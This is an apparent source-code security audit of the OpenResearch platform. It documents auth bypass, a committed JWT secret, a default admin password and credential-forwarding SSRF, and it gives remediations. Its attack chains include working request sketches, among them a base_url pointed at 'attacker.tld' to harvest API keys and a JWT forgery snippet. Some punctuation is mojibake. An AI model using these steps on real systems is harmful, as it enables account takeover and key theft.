# OpenResearch Monorepo — Security Audit Report (#15)

**Target:** `C:\Users\moham\Pictures\OpenResearch`
**Mode:** Read-only static source review ("pentest-of-source"). No files modified, no requests sent against live systems, no secret values printed (masked throughout).
**Date:** 2026-08-26

---

## Scope & Methodology

### In scope
| Layer | Paths examined |
|---|---|
| Backend API | `apps/api/app/{api/v1/endpoints,core,models,schemas,services,plugins}`, `app/main.py`, `alembic/` |
| AuthN/AuthZ | `services/auth.py`, `core/rate_limit.py`, `core/config.py`, `endpoints/auth.py`, `endpoints/teams.py` |
| File handling | `services/pdf_extractor.py`, `endpoints/papers.py`, `storage/` |
| Realtime | `endpoints/collaboration.py` (WebSocket), `endpoints/chat.py` + `ai_writing.py` (SSE) |
| Plugins | `services/plugin_runtime.py`, `services/plugin_service.py`, `endpoints/plugins.py` |
| Secrets/providers | `services/provider_settings.py`, `endpoints/provider_settings.py`, `provider_status.py`, `.env*` (keys only) |
| External fetches | `core/http_client.py`, `zotero_service.py`, `literature_search_service.py`, `identifier_resolver.py`, `graph_service.py`, Grobid integration |
| Frontend | `lib/api/client.ts`, contexts (localStorage), chat/document components (XSS sinks) |
| Infra/CI | `infrastructure/*.yml`, `Dockerfile.api/web`, `.github/workflows/ci.yml`, `.gitignore`, git index |
| Docs | `docs/SECURITY.md` |
| Dependencies | `npm audit --json` (root), `pip list --outdated` (api venv), `requirements.lock` |

### Method
1. Attack-surface mapping of all routers (`api/v1/api.py`).
2. Line-by-line review of auth, authorization helpers, crypto, rate limiting, uploads, WS/SSE handlers, plugin dispatch, external HTTP calls.
3. Cross-check greps: raw SQL (`text(`), command execution (`subprocess`/`shell=`), XSS sinks (`dangerouslySetInnerHTML`, `innerHTML`, `eval`), token storage (`localStorage`).
4. Read-only dependency scans; config/deployment review; docs-vs-reality audit.

### Out of scope
Dynamic exploitation of running instances; internals of node_modules/.venv; deep CVE research beyond registry tooling output.

---

## Threat Model Summary

OpenResearch is a **self-hostable, "local-first" research platform whose current design intentionally runs without login**: the backend resolves every request to an auto-provisioned local **admin** account unless a *valid* bearer token is presented (`services/auth.py:108-129`). The frontend sends **no Authorization header at all** (`apps/web/src/lib/api/client.ts:59-79`) and stores no tokens — the product relies entirely on this fallback.

Consequences:

1. **Any actor who can reach the API port is the administrator.** The selfhost compose publishes the API on `0.0.0.0:8000` (LAN-exposed) while DB/Redis/Grobid/Ollama are loopback-bound. Every object-level RBAC check (~60 call sites of `verify_user_access_to_owner`) plus `get_current_admin_user` evaluates an attacker-controlled identity that defaults to admin.
2. **Registered multi-user accounts exist but are unprotected**: JWTs signed with a publicly-committed default HS256 secret (confirmed present in on-disk `apps/api/.env`, value masked) are forgeable; the local admin's password equals its email string.
3. **Trusted-input surfaces**: uploaded PDFs (Grobid + pdfplumber), CSL/Zotero JSON imports, external metadata providers, user-settable AI-provider base URLs (SSRF), plugin entrypoints (in-process Python imports).
4. **Assets at risk**: unpublished manuscripts & PDF libraries, RAG corpora, cloud LLM/Zotero API keys (`provider_keys.json`), document contents, team workspaces.

---

## Executive Summary

| Severity | Count |
|---|---|
| **CRITICAL** | 4 |
| **HIGH** | 6 |
| **MEDIUM** | 10 |
| **LOW** | 7 |
| **INFO** | 5 |

Many layers show genuine care (streamed bounded uploads, parameterized ORM everywhere, sanitized filenames, log-injection-safe request IDs, non-root container, CI dependency audits, npm audit fully clean). **However, the authentication core nullifies nearly all of it.** Four independent critical flaws chain into total compromise:

- **C1 — Authentication bypass to auto-created ADMIN** (`services/auth.py:108-129`): invalid/expired/garbage/absent bearer tokens silently fall through (`except jwt.InvalidTokenError: pass`) to the auto-created local admin user.
- **C2 — Hard-coded default credential** (`services/auth.py:19,86`): local admin's password is literally its email string.
- **C3 — Publicly-known JWT signing secret** (`core/config.py:7,26`; on-disk `apps/api/.env`; `.env.example`): HS256 key committed to the repo; the production guard triggers only when `ENVIRONMENT=production` is explicitly set (it is not in `apps/api/.env`).
- **C4 — Anonymous write access to global AI-provider configuration** (`endpoints/provider_settings.py:65-105`): PUT/DELETE of provider configs — including arbitrary `base_url` — guarded only by `get_current_user`. Converts C1 into **cloud API-key exfiltration** via credential-forwarding SSRF.

### Primary attack-chain narratives

- **Chain A — Zero-click LAN takeover → data exfiltration → key theft (C1+C4).** No-token requests become admin; enumerate projects/documents/PDFs; stream any PDF; point the active provider `base_url` at an attacker host; harvest the victim's LLM API key on the next AI call.
- **Chain B — Offline JWT forgery (C3).** Mint HS256 tokens for any `sub` with the committed secret; refresh tokens valid 30 days, no revocation.
- **Chain C — Known-password admin login (C2).** Valid login as built-in admin survives naive C1 fixes.
- **Chain D — Rate-limit bypass (H).** Spoofed `X-Forwarded-For` per request defeats login/register/refresh throttling.

---

## Critical Attack Chains (step-by-step exploitation walkthroughs)

### Chain A: Unauthenticated admin compromise and API-key theft (CRITICAL)
1. Recon: `GET /` returns welcome JSON; `/api/v1/openapi.json` served whenever `ENVIRONMENT != production` (default dev) exposes the entire schema.
2. `GET /api/v1/projects` with **no** Authorization header → `get_current_user` never finds a token → `get_or_create_local_user(db)` creates `local@openresearch.dev` with `is_admin=True` on first hit. Everything created through the UI (which never logs in) belongs to this owner, so the entire working dataset is exposed.
3. Exfiltrate: `GET /projects/{id}/papers`, `GET /papers/{id}/pdf` (FileResponse), `GET /documents/{id}` — all pass because the acting user is admin/owner.
4. Escalate to secrets: `PUT /ai/providers/custom {"api_key":"x","base_url":"https://attacker.tld/v1","model":"gpt-4o-mini","is_active":true}` (endpoint lacks admin gating anyway post-C1). The next chat/AI call makes the server POST to the attacker host; when a real key is configured for that provider entry it leaves the network with the request (`Authorization: Bearer <real key>`).
5. Persistence: `POST /plugins/register` (admin-only — satisfied) installs an enabled hook such as `on_export` that mutates every future export payload — behavior-level backdoor without touching disk.
6. Cover tracks: delete papers/documents at will; logs contain correlation IDs only — no identity or auth events exist at all.

### Chain B: Offline JWT forgery via committed signing key (CRITICAL)
1. Obtain `SECRET_KEY` from the repo (`.env.example` ships it; identical value confirmed in on-disk `apps/api/.env` — masked here).
2. `ENVIRONMENT` in `apps/api/.env` is not `production`, so `validate_production_security` (`config.py:90-110`) never rejects the known-compromised constant.
3. Craft `jwt.encode({"sub":"<victim uuid>","email":"victim@example.com","exp":+24h,"token_type":"access"}, KEY, "HS256")`.
4. `GET /auth/me` returns the victim identity; all membership checks now evaluate the victim's rights → cross-workspace theft in any multi-user deployment.
5. Longevity: forge `token_type:"refresh"` with 30-day expiry; `/auth/refresh` reissues pairs forever — no `jti`, no denylist, no reuse detection.

### Chain C: Hard-coded local-admin credential (CRITICAL)
1. Public source yields email `local@openresearch.dev` and the fact that `get_or_create_local_user` hashes that same string **as the password** (`auth.py:86`).
2. `POST /auth/login {"email":"local@openresearch.dev","password":"local@openresearch.dev"}` → 200 with admin token pair (access 24 h, refresh 30 d).
3. Survives remediations of C1 that merely make bad tokens fail, because this is a *valid* login.

### Chain D: Rate-limit bypass enabling credential stuffing (HIGH)
1. `POST /auth/login` sending `X-Forwarded-For: <random IP>` each attempt — `rate_limit.py:18-22` trusts the first XFF value unconditionally, so each spoofed IP gets a fresh window.
2. The 10-per-5-min cap becomes unlimited; bcrypt throttles CPU only, not attempts. Same bypass applies to register (mass account creation) and refresh limiters.

---

## Detailed Findings by OWASP Category

Severity scale CRITICAL > HIGH > MEDIUM > LOW > INFO. Locations are `file:line`.

### A01 Broken Access Control

**CRITICAL â€” A01-1: Invalid JWT silently degrades to auto-created ADMIN user**
- Where: `apps/api/app/services/auth.py:108-129` (`get_current_user`), fallback `get_or_create_local_user` at :71-105; `HTTPBearer(auto_error=False)` at :17.
- Detail: Every failure mode (missing header, malformed token, expired signature, wrong `token_type`, unknown `sub`) is swallowed identically and resolved to the local admin. Consequently `get_current_admin_user` (:132-138) authorizes anonymous callers for plugin register/toggle/config, and all ~60 `verify_user_access_to_owner` object checks evaluate an attacker-defaulted identity. No environment flag disables local mode.
- PoC sketch: `curl -H "Authorization: Bearer garbage" $API/api/v1/projects` â†’ 200 list; unauthenticated `POST /api/v1/plugins/register` â†’ 201.
- Impact: Total loss of confidentiality/integrity across all workspaces; defeats every downstream RBAC control.
- Remediation: Raise 401 on any invalid/expired token; gate local mode behind explicit `LOCAL_SINGLE_USER_MODE=1` (loopback-only); regression tests asserting 401 for garbage tokens on protected routes.

**HIGH â€” A01-2: AI-provider settings writable without admin (global config poisoning)**
- Where: `endpoints/provider_settings.py:53-105` (`PUT/DELETE /ai/providers/{provider}`, `PUT /ai/rate-limit`, `PUT /ai/autocomplete-settings`, `POST .../setup`).
- Detail: Only `get_current_user` guards global cross-user configuration â€” anonymous under A01-1; even post-fix, any non-admin can rewrite provider routing for everyone.
- Impact: SSRF pivot (A10-1), API-key redirection/theft, billing abuse.
- Remediation: Require `get_current_admin_user`; audit-log changes.

**HIGH â€” A01-3: WebSocket collaboration lets viewers write documents; handshake accepted pre-auth**
- Where: `endpoints/collaboration.py:171-223` (`_authenticate_websocket`), :241 (`accept()` before auth), :318-335 (`doc_edit` â†’ `_persist_doc_edit` :40-61).
- Detail: (a) socket accepted before identity proof â€” anonymous clients occupy slots up to the 10 s auth timeout; (b) empty-token auth frame joins as local user (:187-198) â€” A01-1 over WS; (c) membership checked **without** `required_roles`, so a `viewer` can persist arbitrary `content_json`/`plain_text` and bump document version â€” viewerâ†’editor escalation; (d) frame-size check occurs after full buffering (:268-271).
- PoC sketch: connect â†’ `{"type":"auth"}` â†’ `{"type":"doc_edit","content_json":{...},"plain_text":"defaced"}` as viewer â†’ server-side mutation.
- Remediation: Enforce `required_roles=["owner","editor"]` for persistence; reject empty tokens outside local mode; per-room connection cap.

**MEDIUM â€” A01-4: Team member role string unvalidated** â€” `teams.py:214` persists arbitrary role strings (fail-closed today, silent drift risk). Validate against `{owner,editor,viewer}`.

**MEDIUM â€” A01-5: User enumeration via team invite** â€” `teams.py:206-208` returns 404 "User with email â€¦ not found", distinguishing registered emails. Use uniform responses.

**LOW â€” A01-6: Global cache-clear/quota endpoints lack admin gating** â€” `endpoints/provider_status.py:20-30`.

### A02 Cryptographic Failures

**CRITICAL â€” A02-1: Committed, publicly-known JWT signing secret; production guard sidestepped**
- Where: `core/config.py:7` literal, :26 default, :90-104 validator gated on exact `ENVIRONMENT=production`. On-disk `apps/api/.env` uses the committed default and is not production (verified by masked boolean checks). `.env.example` ships the identical string plus default DB credentials.
- Impact: Offline forgery of access and refresh tokens (Chain B).
- Remediation: Fail startup when secret âˆˆ `KNOWN_COMPROMISED_DEFAULT_SECRETS` in ANY environment unless explicit dev override; generate random key on first boot into gitignored storage; treat committed value as leaked and rotate.

**MEDIUM â€” A02-2: No token revocation/rotation binding/jti; 30-day refresh** â€” `services/auth.py:35-59`, `config.py:28-29`, `endpoints/auth.py:87-110`. Add jti+denylist, reuse detection, shorter TTL.

**MEDIUM â€” A02-3: Plaintext at-rest storage of third-party API keys** â€” `services/provider_settings.py:110-133`: `storage/provider_keys.json`, no encryption/keyring/file-mode hardening. Contradicts docs claim #4. Use OS keyring or env-master-key envelope encryption; restrict ACLs.

**LOW â€” A02-4: No password policy; bcrypt 72-byte truncation undocumented** â€” `services/auth.py:23-32` (truncation handled safely).

**INFO â€” A02-5: Algorithm pinned HS256** â€” avoids alg-confusion (positive).

### A03 Injection

Positive baseline: no SQL injection â€” ORM-only queries; only static `text()` uses (`health.py:24`; parameterized migration). No shell interpolation in subprocesses (`tabby_setup_service.py:85-112,250,287` fixed argv).

**MEDIUM â€” A03-1: Unvalidated identifier interpolation into third-party API URLs** â€” `services/identifier_resolver.py:82,179,252` (Crossref/arXiv/PubMed); cleaners (:34-54) strip prefixes but don't validate charset â†’ path/query injection upstream + attacker-chosen cache keys (:74). Not host-redirecting SSRF (fixed hosts). Fix: strict regex validation + percent-encoding of path segments.

**MEDIUM â€” A03-2: XML entity-expansion DoS surface in GROBID TEI parsing** â€” `pdf_extractor.py:163-166` uses stdlib `xml.etree.ElementTree.fromstring` on Grobid output derived from attacker PDFs. ET blocks external entities but permits internal entity expansion (billion laughs / quadratic blowup) inside request threads. Fix: `defusedxml`, size cap, parse semaphore.

**MEDIUM â€” A03-3: Untrusted PDF parsing exposure (parser DoS/polyglots)** â€” magic-header-only validation (`pdf_extractor.py:81-102`), full-document pdfplumber walk (:285-380) without page/object budgets; crafted PDFs stress worker threads (availability impact). Fix: page budgets, decompression limits, optional AV scan.

**LOW â€” A03-4: Prompt injection in grounded answers** â€” paper text concatenated into prompts (`papers.py:545-557`); team members can steer others' AI summaries. Delimit retrieved passages; instruct refusal on embedded instructions.

### A04 Insecure Design

Root cause: **"no-login local mode" implemented as an authentication fallback instead of a deployment mode**, turning a UX decision into an authorization bypass (all Critical chains). Secondary: global mutable provider store shared across users; in-process plugin execution; WS protocol conflating transport and app auth.

### A05 Security Misconfiguration

**HIGH â€” A05-1: Selfhost compose exposes the vulnerable API on all interfaces** â€” `infrastructure/docker-compose.selfhost.yml`: api binds `${API_PORT:-8000}:8000` on 0.0.0.0 while data services bind 127.0.0.1. Advertises anonymous-admin to the LAN. Bind loopback by default.

**MEDIUM â€” A05-2: No security headers; TLS never enforced in shipped stacks** â€” `main.py:77-90` lacks CSP/HSTS/nosniff/X-Frame-Options/Referrer-Policy; no reverse proxy included; docs claim TLS mandatory (see reality check below).

**MEDIUM â€” A05-3: CORS `allow_credentials=True` with wildcard methods/headers** â€” `main.py:82-88`. Enumerate methods; drop credentials (bearer API needs none).

**LOW â€” A05-4:** OpenAPI/Swagger exposed whenever ENVIRONMENTâ‰ production (on-disk env isn't production).

**LOW â€” A05-5:** `.env.example` doubles as working config; weak default Postgres password reused as compose fallback.

**INFO â€” A05-6 (positive):** non-root container user, lockfile build, healthchecks, prod hides docs (`main.py:65-75`).

### A06 Vulnerable & Outdated Components

- npm root: **0 vulnerabilities** of 699 deps (`npm audit --json`); CI gates `npm audit --omit=dev --audit-level=high`.
- Python: `pip list --outdated` shows only patch-level updates (cryptography 50.0.0â†’50.0.1, pip, setuptools, pydantic_core). Modern pins incl. fastapi 0.141.1, starlette 1.6.0, pyjwt 2.13.0, bcrypt 5.0.0, httpx 0.28.1, sqlalchemy 2.0.52, python-multipart 0.0.32; CI runs pip-audit against requirements.lock.
- Residual: floating image tags (`grobid:0.8.0`, `ollama:latest`, `redis:7-alpine`, `pgvector:pg16`) â€” pin digests; add Renovate/Dependabot.

### A07 Identification & Authentication Failures

**HIGH â€” A07-1: Hard-coded default credential for built-in admin** â€” password equals well-known email string (`auth.py:19,86`); survives naive C1 fixes. Generate random first-run secret or refuse login for this account.

**MEDIUM â€” A07-2:** Login throttling keyed on spoofable IP (see A08-1).

**MEDIUM â€” A07-3:** No account lockout/MFA/email verification on registration (`endpoints/auth.py:52-67`) â€” acceptable locally, hostile for hosted multi-user.

**INFO â€” A07-4:** CSRF largely moot today (no cookies, no tokens client-side) â€” revisit when real browser sessions land.

### A08 Software & Data Integrity Failures

**HIGH â€” A08-1: Client-supplied X-Forwarded-For trusted verbatim for rate limiting** â€” `core/rate_limit.py:18-22`; enables Chain D plus unbounded `_hits` dict growth (slow memory DoS via rotated fake IPs). Key off `request.client.host` unless behind trusted proxies; bound memory; Redis-backed limiter when scaling.

**MEDIUM â€” A08-2: Plugin runtime = unsandboxed in-process Python imports** â€” `services/plugin_runtime.py:36-66,73-110`; namespace allowlist â‰  sandbox; hook dispatch reachable anonymously post-C1 (`plugins.py:37-57`); exception strings leak to callers (:106-107); resolution cache not purged on toggle. Isolate third-party plugins in subprocesses with resource limits; purge cache; validate payload size.

**MEDIUM â€” A08-3: Floating infrastructure image tags** â€” supply-chain drift risk (digest-pin).

### A09 Security Logging & Monitoring Failures

**MEDIUM â€” A09-1: Zero authentication/security event logging** â€” no audit trail for login success/failure, registration, refresh, provider-config changes, plugin ops, deletions (`services/auth.py`, `endpoints/auth.py`). Incident response impossible; identity telemetry meaningless while everyone is "the local user". Add structured audit events keyed to existing correlation IDs.

**LOW â€” A09-2:** Upstream error snippets logged verbatim (`pdf_extractor.py:131,158`; `zotero_service.py:192`).

**POSITIVE â€” A09-3:** generic 500 envelope with sanitized correlation IDs (`middleware.py:18-68`) prevents stack-trace leakage and log injection.

### A10 Server-Side Request Forgery (SSRF)

**HIGH â€” A10-1: Attacker-controlled LLM/Tabby base URLs turn the server into an authenticated HTTP client** â€” stored via `PUT /ai/providers/{p}` and `PUT /ai/autocomplete-settings` (anonymous under C1/C4); consumed by LLM calls and reachability probes (`provider_settings.py:65-83,132-139`). No scheme/host allowlisting, no private-CIDR/metadata blocking; probes give an internal-port oracle; provider keys ride along as Authorization headers to whatever host is configured (credential-forwarding SSRF). Remediation: allowlist schemes, block link-local/loopback/metadata except operator-designated local engines, re-validate operator consent before sending keys to changed bases.

**MEDIUM â€” A10-2:** Grobid target is env-fixed (good) but receives raw attacker PDFs and is itself historically SSRF/XXE-prone â€” segment it; it already sits on the internal compose network (positive).

**INFO â€” A10-3:** fixed-base academic APIs with weakly validated IDs â€” see A03-1.

### XSS / Frontend Findings

Positive baseline: no dynamic `dangerouslySetInnerHTML` (only a static theme-init script, `app/layout.tsx:33-57`); chat answers render via React text interpolation (`AiResearchChat.tsx:527-534`); no eval/document.write/markdown-to-HTML pipelines; no tokens in localStorage (no tokens client-side at all).

**LOW â€” XSS-1:** safety rests entirely on React escaping; abstracts/AI answers originate from external providers and attacker-uploaded PDFs. Any future rich-text/markdown renderer reintroduces the sink â€” codify DOMPurify/rehype-sanitize policy now. WS-broadcast `content_json` is persisted and fanned out (`collaboration.py:318-335`) â€” verify editor schema rejects HTML-typed nodes (verification item).

**LOW â€” XSS-2:** absence of CSP (A05-2) removes defense-in-depth.

### File Upload / Storage

Positive: streamed bounded writes with partial cleanup (`papers.py:101-132`), declared-length precheck, filename sanitization + UUID prefix (`pdf_extractor.py:104-111`).

- **MEDIUM â€” UP-1:** magic-header-only validation allows polyglots; MIME claim in docs overstated (see A03-3).
- **LOW â€” UP-2:** `get_upload_dir(project_id)` joins raw path param (`papers.py:45-49`); currently mitigated because project lookup precedes directory creation, but add a realpath containment assertion as defense-in-depth.
- **LOW â€” UP-3:** no upload quotas; upload endpoint lacks rate limiting â†’ disk exhaustion.

---

## Dependency Vulnerability Scan Results

npm (root): `{info:0, low:0, moderate:0, high:0, critical:0}` â€” total 699 dependencies (166 prod / 494 dev / 91 optional).

Python outdated: cryptography 50.0.0â†’50.0.1; pip 24.0â†’26.2.1; setuptools 79.0.1â†’84.0.0; pydantic_core 2.46.4â†’2.48.0. All other pins current majors; CI enforces pip-audit + npm audit gates.

Verdict: dependency hygiene is a strength; remaining gap is unpinned infra image tags.

---

## Security Documentation vs Reality (docs/SECURITY.md claims audit)

| # | Claim | Reality | Status |
|---|---|---|---|
| 1 | Local-first, no external cloud transmission | True when unconfigured; literature search/resolvers/cloud providers do transmit titles/abstracts/queries externally once enabled | Mostly accurate |
| 2 | Tenant & data isolation via access controls | Auth fallback makes every caller the auto-created admin (`auth.py:108-129`); frontend never authenticates; WS viewers can write (A01-3) | FALSE as deployed |
| 3 | Uploaded PDFs validated for MIME type; traversal-safe; UUID names | Traversal-safe naming true; MIME validation false (byte-sniff of `%PDF-` only) | Partially false |
| 4 | Encryption in transit & at rest; API keys stored securely | At rest false â€” plaintext `provider_keys.json` (`provider_settings.py:130-133`); no TLS termination/HSTS anywhere in shipped stacks | FALSE |
| 5 | No third-party training | Policy statement; cloud providers do receive user content under their retention policies | Unverifiable |

Doc gaps: the local-admin fallback is undisclosed; no key-rotation guidance; no secret policy despite `KNOWN_COMPROMISED_DEFAULT_SECRETS` existing in code.

---

## Positive Observations

1. Zero npm vulnerabilities; modern locked Python deps; both audits wired as failing CI gates.
2. Parameterized ORM exclusively; no string-built SQL; static `text()` only.
3. Fixed argv subprocess usage; correct Windows creation-flag handling.
4. Streamed size-bounded uploads with partial-file cleanup and header-before-buffer validation.
5. Filename sanitization + UUID prefixing defeats direct traversal on upload naming.
6. Generic error envelope + sanitized correlation IDs (log-injection safe); no stack traces to clients.
7. First-message WS auth keeps tokens out of URLs; per-socket rate limit; oversized-frame rejection logic exists.
8. Honest-refusal RAG design (insufficient-evidence flags, trust legend).
9. Production validator rejects known-compromised secrets and SQLite (right idea, wrong trigger scope).
10. Non-root Docker user; lockfile-based build; loopback bindings for all data services in compose.
11. Frontend free of classic XSS sinks; no secrets in browser storage.
12. Race-safe concurrent provisioning of the local user.

---

## Prioritized Remediation Roadmap

### P0 â€” Ship-blockers (exploitable by any network peer)
1. Kill the auth fallback (A01-1): raise 401 on missing/invalid tokens; explicit opt-in `LOCAL_SINGLE_USER_MODE` that short-circuits rather than swallows errors; regression tests.
2. Remove the hard-coded local-admin credential (A07-1): random first-run secret or refuse login for the built-in account.
3. Eradicate the committed signing secret (A02-1): startup failure on compromised constants in every environment; rotate the leaked value; auto-generate dev keys.
4. Admin-gate global provider/rate-limit endpoints (A01-2, A01-6) + SSRF guardrails for user-settable base URLs (A10-1).
5. Bind selfhost API port to loopback by default (A05-1); ship TLS-terminating proxy profile; encrypt provider keys at rest (A02-3) or fix docs claim 4.

### P1 â€” High-value hardening (next two iterations)
6. WS collaboration: role-checked doc_edit persistence; reject tokenless auth frames outside local mode; accept-after-auth; per-room caps (A01-3).
7. Rate limiter: derive key from socket peer unless trusted-proxy chain; bound limiter memory; Redis backend when scaling (A08-1).
8. defusedxml for TEI parsing; PDF page/object budgets; real content sniffing (A03-2/A03-3/UP-1).
9. Identifier charset validation for Crossref/arXiv/PubMed calls (A03-1).
10. Token lifecycle: shorter refresh TTL, jti + denylist, rotation-reuse detection (A02-2).
11. Structured security audit logging (A09-1).
12. Plugin isolation roadmap: subprocess sandbox for third-party hooks; purge resolution cache on toggle (A08-2).

### P2 â€” Hygiene
13. Security-headers middleware; enumerate CORS methods; drop credentials (A05-2/A05-3).
14. Digest-pinning for infra images; Renovate/Dependabot (A06/A08-3).
15. Uniform team-invite responses (A01-5); role enum validation (A01-4); upload quotas + rate limit (UP-3).
16. Update docs/SECURITY.md to describe local-mode blast radius honestly; add key-rotation runbook.

---

*End of report. All findings verified against source at commit time of review; no live systems were contacted.*

